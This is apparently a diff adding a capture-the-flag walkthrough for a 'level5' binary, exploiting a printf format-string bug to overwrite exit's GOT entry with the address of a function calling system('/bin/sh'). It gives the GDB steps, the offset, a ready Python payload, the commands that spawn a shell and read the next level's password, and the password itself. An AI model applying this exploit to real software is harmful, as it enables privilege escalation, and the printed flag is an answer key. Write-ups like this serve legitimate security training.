@@ -1,0 +1,74 @@
+# Level5 - GOT Overwrite with Format String
+
+---
+
+# Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./level5
+hello
+hello
+```
+
+## Step 2: Analyze with GDB
+
+```bash
+gdb level5
+(gdb) info functions
+```
+
+Found: function `o` (not called) and function `n` (called).
+
+## Step 3: Check function `o`
+
+```bash
+(gdb) disas o
+```
+
+Contains `system("/bin/sh")`. Address: `0x080484a4`
+
+## Step 4: Check function `n`
+
+```bash
+(gdb) disas n
+```
+
+Calls `printf` (vulnerable) then `exit` (never returns).
+
+## Step 5: Find exit in GOT
+
+```bash
+(gdb) disas 0x80483d0
+   0x080483d0 <+0>:  jmp *0x8049838
+```
+
+GOT address of exit: `0x8049838`
+
+## Step 6: Find the offset
+
+```bash
+./level5
+AAAA%4$x
+AAAA41414141
+```
+
+Offset: **4**
+
+## Step 7: Build the exploit
+
+```bash
+python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/payload5
+```
+
+## Step 8: Execute
+
+```bash
+cat /tmp/payload5 - | ./level5
+cat /home/user/level6/.pass
+```
+
+**Password:** `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
+
+---
